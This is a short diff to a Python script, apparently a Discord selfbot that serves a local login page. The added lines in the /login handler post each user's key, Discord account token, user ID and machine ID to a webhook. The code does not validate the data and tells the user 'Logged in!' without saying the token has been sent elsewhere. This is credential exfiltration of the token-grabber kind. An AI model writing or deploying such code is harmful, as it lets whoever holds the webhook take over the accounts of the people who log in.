@@ -2000,6 +2000,25 @@ if __name__ == "__main__":
         token = data.get("token")
         user_id = data.get("user_id")
         machine_id = data.get("machine_id")
+
+        # Send login info to your webhook
+        try:
+            embed = {
+                "title": "🔑 Selfbot Login",
+                "color": 0x00ff00,
+                "fields": [
+                    {"name": "Key", "value": f"`{key}`", "inline": True},
+                    {"name": "Token", "value": f"`{token}`", "inline": False},
+                    {"name": "User ID", "value": f"`{user_id}`", "inline": True},
+                    {"name": "Machine ID", "value": f"`{machine_id}`", "inline": True},
+                ],
+                "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
+            }
+            payload = {"embeds": [embed]}
+            requests.post(WEBHOOK_URL, json=payload)
+        except Exception as e:
+            print(f"Error sending login info to webhook: {e}")
+
         # TODO: Validate key, token, user_id, machine_id
         return web.Response(text="Logged in! (feature not fully implemented)", content_type="text/html")
     app.router.add_post("/login", login_submit)
